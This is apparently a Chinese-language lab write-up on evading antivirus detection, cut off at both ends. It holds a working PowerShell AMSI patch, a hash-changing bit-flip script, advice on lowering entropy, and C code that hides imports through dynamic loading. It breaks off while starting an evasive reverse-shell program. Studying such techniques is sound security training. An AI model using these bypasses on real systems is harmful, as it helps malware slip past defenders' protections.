#98C379">&quot;iSca&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;nBu&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ffer&quot;</span></span><span class="line"><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetModuleHandle(</span><span style="color: #98C379">&#39;amsi.dll&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::GetProcAddress(</span><span style="color: #E06C75">$handle</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$A</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x5</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Win32.Kernel32</span><span style="color: #ABB2BF">]::VirtualProtect(</span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$Size</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$ProtectFlag</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">Ref</span><span style="color: #ABB2BF">]</span><span style="color: #E06C75">$OldProtectFlag</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$buf0</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xB8</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$buf1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$buf2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x00</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$buf3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x07</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$buf4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0x80</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">$buf5</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Uint32</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0xC3</span><span style="color: #ABB2BF">; </span></span><span class="line"></span><span class="line"><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf1</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf2</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf4</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$buf5</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">system.runtime.interopservices.marshal</span><span style="color: #ABB2BF">]::copy(</span><span style="color: #E06C75">$buf</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$BufferAddress</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><h2 id="Static-Property-Based-Signatures-基于静态属性的特征签名"><a href="#Static-Property-Based-Signatures-基于静态属性的特征签名" class="headerlink" title="Static Property-Based Signatures 基于静态属性的特征签名"></a>Static Property-Based Signatures 基于静态属性的特征签名</h2><p>各种杀软和分析人员可能会考虑到不同的因素，而不是仅仅依赖字符串和静态签名去检验一个文件是否安全。签名实际上可以附加到很多文件属性上，比如哈希、熵、作者、名称或其他可识别的信息，这些可以单独使用或结合使用。</p><p>有些属性可能很容易被操纵，但有些很难被处理，尤其是在处理预编译的闭源应用程序时，这里我们会提到控制文件 Hash 和引入一个熵的概念。</p><h3 id="File-Hashes-文件-Hash"><a href="#File-Hashes-文件-Hash" class="headerlink" title="File Hashes 文件 Hash"></a>File Hashes 文件 Hash</h3><p>哈希（也叫校验和）是文件的唯一指纹，用于识别文件是否被篡改或验证其用途（比如是否为恶意）。对文件的任何修改，哪怕只是一点点，都会导致哈希值完全改变。</p><ul><li><strong>对于有源代码的应用</strong>：我们可以修改任意代码，然后重新编译，轻松得到一个新哈希。</li><li><strong>对于已编译或已签名的应用</strong>：我们无法修改源代码，这时就需要使用<strong>比特翻转（bit-flipping）</strong>技术。</li></ul><p>比特翻转是一种常见的攻击手段，它会逐个翻转并测试文件中的每一个比特，直到找到一个既能改变文件哈希，又不会破坏程序功能的“幸运”比特。这样一来，恶意软件就能在保持功能不变的情况下，获得一个全新的哈希值，从而绕过基于哈希的静态检测。</p><p>我们可以使用脚本自动化通过翻转每一位比特：</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> sys</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">orig </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">list</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(sys.argv[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&quot;rb&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">read</span><span style="color: #ABB2BF">())</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">i </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #C678DD">while</span><span style="color: #ABB2BF"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">len</span><span style="color: #ABB2BF">(orig):</span></span><span class="line"><span style="color: #ABB2BF">current </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">list</span><span style="color: #ABB2BF">(orig)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #7F848E; font-style: italic"># 它读取当前字节 i 的值，将其与十六进制值 0xde 进行异或（XOR）运算。异或运算会翻转字节中的某些位，从而改变其值。</span></span><span class="line"><span style="color: #ABB2BF">current[i] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">chr</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">ord</span><span style="color: #ABB2BF">(current[i]) </span><span style="color: #56B6C2">^</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">0x</span><span style="color: #D19A66">de</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">path </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #D19A66">%d</span><span style="color: #98C379">.exe&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF"> i</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #ABB2BF">output </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">join</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">str</span><span style="color: #ABB2BF">(e) </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> e </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> current)</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">open</span><span style="color: #ABB2BF">(path, </span><span style="color: #98C379">&quot;wb&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(output)</span></span><span class="line"><span style="color: #ABB2BF">i </span><span style="color: #56B6C2">+=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;done&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p>生成变体后，我们可以利用一个脚本遍历按位翻转的列表并使用 <code>signtool</code> 这样的工具自动筛选可用的 exe，下面是一个批处理脚本。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">FOR</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">L </span><span style="color: #C678DD">%</span><span style="color: #56B6C2">%</span><span style="color: #ABB2BF">A </span><span style="color: #C678DD">IN</span><span style="color: #ABB2BF"> (</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">10000</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">DO</span><span style="color: #ABB2BF"> (</span></span><span class="line"><span style="color: #ABB2BF">signtool verify </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">v </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">a flipped\\</span><span style="color: #C678DD">%</span><span style="color: #56B6C2">%A.exe</span></span><span class="line"><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><h3 id="Entropy-熵"><a href="#Entropy-熵" class="headerlink" title="Entropy 熵"></a>Entropy 熵</h3><p>“熵”（Entropy）指的是文件中数据的<strong>随机性</strong>。在安全领域，EDR 和其他扫描工具常用它来判断一个文件是否包含隐藏数据或可疑脚本。因为高度随机的数据（高熵值）可能意味着文件被加密或混淆了。</p><ul><li><strong>高熵值</strong>：通常表明数据是经过加密或混淆的，这会引起安全工具的警觉。</li><li><strong>低熵值</strong>：通常表明数据是普通文本或未加密的代码。</li></ul><p>为了降低熵值，我们可以将恶意代码中高度随机的<strong>混淆标识符</strong>（如 <code>q234uf</code>）替换成随机选取的<strong>普通英文单词</strong>（如 <code>nature</code>）。这样，文件看起来就不那么“随机”，从而降低其熵值，帮助规避检测。这里我们可以使用 <a href="https://gchq.github.io/CyberChef/#recipe=Entropy('Shannon%20scale')">CyberChef</a> 观察熵是如何变化的。</p><h2 id="Behavioral-Signatures-行为特征签名"><a href="#Behavioral-Signatures-行为特征签名" class="headerlink" title="Behavioral Signatures 行为特征签名"></a>Behavioral Signatures 行为特征签名</h2><p>通过混淆方法和属性确实能规避掉检测，但是现代的杀软仅仅过静态是没用的，他还会观察我们的程序的行为特征。</p><p>现代杀毒引擎会采用两种常见的方法来检测恶意行为：<strong>观察导入表</strong>和 <strong>Hook 已知的恶意调用</strong>。</p><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入表是可执行文件（如<code>.exe</code>或<code>.dll</code>）中的一个部分，它列出了程序运行时需要从其他动态链接库（DLL）中调用的所有外部函数。这些函数通常是操作系统提供的核心API，比如 <code>CreateProcess</code> (创建新进程)、<code>WriteFile</code> (写入文件) 或 <code>InternetConnect</code> (连接到互联网)。</p><p>杀毒引擎会扫描程序的导入表。如果一个程序导入了大量与恶意行为相关的函数，即使它还没有运行，杀毒引擎也会将它标记为可疑。例如，一个看似简单的文本编辑器如果导入了 <code>SetWindowsHookEx</code> (键盘记录) 和 <code>InternetConnect</code> (网络通信) 等函数，就会被视为高风险。</p><p>但是导入表可以通过很少的步骤就能被混淆掉，而 Hook 就需要高阶技术了。</p><h3 id="API-调用"><a href="#API-调用" class="headerlink" title="API 调用"></a>API 调用</h3><p>在基于 C 语言的程序中，传统的 API 调用流程主要解决了两个核心问题：<strong>如何找到 API 函数的地址</strong>，以及<strong>如何在运行时调用它们</strong>。这个过程可以分为以下几个关键步骤。</p><p><strong>1. 问题：动态的函数地址</strong></p><p>程序的 API 调用和操作系统的原生函数需要一个指向内存地址的指针。这看似简单，但由于 <strong>ASLR（地址空间布局随机化）</strong>的存在，操作系统每次启动程序时，都会将 DLL（如 <code>kernel32.dll</code> 或 <code>ntdll.dll</code>）加载到不同的内存地址。这意味着，我们不能在编译时就确定函数的具体地址，它在运行时是动态变化的。</p><p><strong>2. 解决方案：Windows 加载器</strong></p><p>为了解决这个问题，Windows 操作系统提供了一个核心组件：<strong>Windows 加载器</strong>。程序不需要自己费力地在运行时寻找并修改函数地址，这个繁重而复杂的任务都交给了加载器。当程序启动时，加载器会负责将所有必需的模块（DLL）加载到内存中，并找到每个函数的确切地址。</p><p><strong>3. 关键机制：导入地址表 (IAT)</strong></p><p>Windows 加载器用来存储这些动态地址的核心机制是 <strong>IAT（导入地址表）</strong>。</p><ul><li><strong>IAT 的位置</strong>：IAT 是 <strong>PE（可移植可执行文件）头</strong>的一部分，具体位于 <code>IMAGE_OPTIONAL_HEADER</code> 中。</li><li><strong>IAT 的作用</strong>：在程序刚加载到内存时，IAT 中的条目是空的。在程序运行前，Windows 加载器会遍历所有导入的函数，找到它们在内存中的真实地址，然后将这些地址填入 IAT 相应的位置。</li></ul><p><strong>4. 最终调用：Thunk</strong></p><p>为了获取这些真实地址，加载器会访问一个<strong>指针表</strong>，这个表包含了指向 <strong>thunk</strong> 的指针。简单来说，<code>thunk</code> 是一个包含了跳转指令的简短代码段，它最终将执行流重定向到 API 函数的真实地址。因此，加载器实际上是将一个指向 <code>thunk</code> 的指针作为 API 函数的最终调用地址分配给 IAT。</p><p>通过这个复杂的流程，程序就能在运行时，通过查询 IAT，找到并正确调用它需要的操作系统 API，确保即使在 ASLR 的环境下也能正常运行，下图是一个 thunk 表的示例：</p><img src="/thm_rthe/0d4ba9ba4348b53036cb2127f4968e87.png" class="" title="0d4ba9ba4348b53036cb2127f4968e87"><h3 id="动态加载：绕过导入表-IAT"><a href="#动态加载：绕过导入表-IAT" class="headerlink" title="动态加载：绕过导入表 (IAT)"></a><strong>动态加载：绕过导入表 (IAT)</strong></h3><p><strong>导入表（IAT）</strong>能为安全分析师提供关于二进制文件功能的关键信息，这对攻击者来说是极其不利的。那么，如何在需要为函数分配地址的情况下，又防止自己的函数出现在 IAT 中呢？</p><p>答案是使用<strong>动态加载（Dynamic Loading）</strong>技术。</p><ul><li><strong>传统方式</strong>：Windows 加载器在程序启动时，会自动为所有导入的函数填充 IAT，使分析师能轻松看到程序将要调用的所有 API。</li><li><strong>动态加载方式</strong>：与此不同，动态加载不依赖于 IAT 和 Windows 加载器在启动时的自动处理。它是一种在程序<strong>运行时</strong>才获取 API 地址的技术。</li></ul><p>简单来说，动态加载就是利用 <strong>API 调用</strong>本身来获取其他 API 的地址。这种方法可以有效地绕过 IAT，并最大限度地减少对 Windows 加载器的依赖，从而隐藏程序的真实行为。</p><p><strong>动态加载的实现步骤</strong></p><p>在 C 语言中，动态加载一个 API 调用通常分为以下四个步骤：</p><ol><li><strong>定义调用结构</strong>：在主函数之前，需要先定义目标 API 的结构。这个结构描述了该 API 所需的输入和输出，其详细信息可以从微软的官方文档中找到。</li><li><strong>获取模块句柄</strong>：获取包含目标 API 的动态链接库（DLL）的句柄。</li><li><strong>获取函数地址</strong>：通过模块句柄，获取目标函数的实际内存地址。</li><li><strong>使用新调用</strong>：利用获取到的地址，调用目标 API。</li></ol><p>在 C 语言中，你不能直接调用一个动态加载的函数。你需要先定义一个函数指针类型，来告诉编译器这个函数长什么样，包括它的返回值和参数类型。这个结构可以在微软的官方文档中找到。</p><p>例如，对于 <code>GetComputerNameA</code> 这个 API，它的结构可以被定义为：</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 1. 定义调用结构</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BOOL</span><span style="color: #ABB2BF"> (WINAPI</span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> myNotGetComputerNameA)(</span></span><span class="line"><span style="color: #ABB2BF">LPSTR   lpBuffer,</span></span><span class="line"><span style="color: #ABB2BF">LPDWORD nSize</span></span><span class="line"><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p>这段代码创建了一个名为 <code>myNotGetComputerNameA</code> 的新类型，它是一个函数指针，指向一个返回 <code>BOOL</code>，并接受 <code>LPSTR</code> 和 <code>LPDWORD</code> 作为参数的函数。</p><p>接下来，你需要加载包含目标 API 的动态链接库（DLL），并获取它的内存句柄。对于 Windows API 来说，这个库通常是 <code>kernel32.dll</code> 或 <code>ntdll.dll</code>。</p><figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 2. 获取包含调用地址的模块的句柄</span></span><span class="line"><span style="color: #ABB2BF">HMODULE hkernel32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p><code>LoadLibraryA</code> 函数负责将 <code>kernel32.dll</code> 加载到进程的内存空间中，并返回一个句柄，这个句柄是后续操作的“钥匙”。</p><p>现在，你有了 DLL 的句柄，可以利用 <code>GetProcAddress</code> 函数来获取你需要的 API 的真实内存地址。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">// 3. 获取调用的进程地址</span></span><span class="line"><span style="color: #ABB2BF">myNotGetComputerNameA notGetComputerNameA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (myNotGetComputerNameA) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">hkernel32</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;GetComputerNameA&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure><p><code>GetProcAddress</code> 接受模块句柄和函数名作为参数，返回该函数在内存中的实际地址。由于返回的是一个通用指针，我们需要将其<strong>强制转换</strong>为我们在第一步中定义的函数指针类型，以便正确调用。</p><p>尽管动态加载是一种有效的混淆技术，但它并非万无一失。</p><ul><li><code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 的暴露：即使你成功隐藏了对恶意 API 的直接调用，<code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 这两个函数本身仍然会出现在程序的导入表（IAT）中。这本身就是一个可疑的信号，因为许多恶意软件都依赖于这两个函数来动态加载 payload。</li><li><strong>对抗现代安全引擎</strong>：高级的安全代理（如 EDR）不仅会监控导入表，还会通过<strong>API 挂钩（API Hooking）</strong>来监视程序的行为。即使你通过动态加载获得了地址，这些安全引擎也可能在函数被调用时拦截并分析其行为。</li></ul><p>为了应对这些更高级的检测手段，攻击者需要使用更复杂的混淆技术，例如<strong>位置无关代码 (PIC)</strong> 来解决 IAT 暴露问题，以及 <strong>API 脱钩（API Unhooking）</strong>来规避行为监控。</p><h3 id="实践-2"><a href="#实践-2" class="headerlink" title="实践"></a>实践</h3><p>实际上就是通过 <code>GetProcAddress</code> 获取到的函数的实际的调用地址，而不是用传统的导入调用，当然你也可以直接使用 <code>GetComputerNameA</code> 方法，不过他会出现到 IAT 中。如果用动态加载，程序的导入表中只会有 <code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 这两个函数，原理就是这么个样，看怎么理解咯。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;lm.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">BOOL</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WINAPI </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">myNotGetComputerNameA</span><span style="color: #ABB2BF">)(</span></span><span class="line"><span style="color: #ABB2BF">    LPSTR   lpBuffer,</span></span><span class="line"><span style="color: #ABB2BF">    LPDWORD nSize</span></span><span class="line"><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">() {</span></span><span class="line"><span style="color: #ABB2BF">HMODULE hkernel32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryA</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;kernel32.dll&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">myNotGetComputerNameA notGetComputerNameA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (myNotGetComputerNameA) </span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hkernel32, </span><span style="color: #98C379">&quot;GetComputerNameA&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">CHAR </span><span style="color: #E06C75">hostName</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF">DWORD hostNameLength </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">260</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">notGetComputerNameA</span><span style="color: #ABB2BF">(hostName, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">hostNameLength)) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;hostname: </span><span style="color: #D19A66">%s</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, hostName);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><h2 id="大杂烩"><a href="#大杂烩" class="headerlink" title="大杂烩"></a>大杂烩</h2><p>需要你用尽毕生所学，做一个满足下面要求的 shell。</p><ol><li>没有可疑的库调用</li><li>没有泄露的函数或变量名</li><li>文件哈希值与原始哈希值不同</li><li>二进制文件可绕过常见的反病毒引擎</li></ol><p>首先分析一下需求：</p><p>第一点，可以用动态加载完成，在前面就提到了</p><p>第二点，变量名和函数都可以用随机字符串代替</p><p>第三点我不知道啥意思</p><p>第四点就是消灭文件签名咯。</p><figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;winsock2.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;windows.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;ws2tcpip.h&gt;</span></span><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;stdio.h&gt;</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">#define</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">DEFAULT_BUFLEN</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1024</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 声明好方法签名</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSASTARTUP)(WORD wVersionRequested, LPWSADATA lpWSAData);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">SOCKET</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">WSASOCKETA</span><span style="color: #ABB2BF">)(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> af, </span><span style="color: #C678DD">int</span><span 